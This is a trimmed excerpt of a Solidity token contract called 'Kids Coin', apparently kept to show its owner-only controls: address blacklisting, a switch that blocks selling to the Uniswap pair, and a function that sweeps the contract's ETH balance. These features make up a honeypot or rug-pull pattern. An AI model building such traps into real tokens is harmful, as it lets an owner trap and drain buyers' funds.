...
contract KidsCoin is Context, IERC20, Ownable {
    ...
    string private _name = "Kids Coin";
    ...
    uint256 public developmentDivisor = 9;
    ...
    function _transfer(
        ...
        require(blackListed[from]== false && blackListed[to]==false,"account" );
        ...
        if (from != _enabledAddLiquidityAddress && to == uniswapV2Pair) {
            ...
            require(sellTradingEnabled == true, "Sell not allowed!");
        }
    ...
    function AddLiquiditySweep() external onlyOwner {
        uint256 balance = address(this).balance;
    ...
    function setSellTradingEnbled(bool value) external onlyOwner {
        sellTradingEnabled = value;
    }
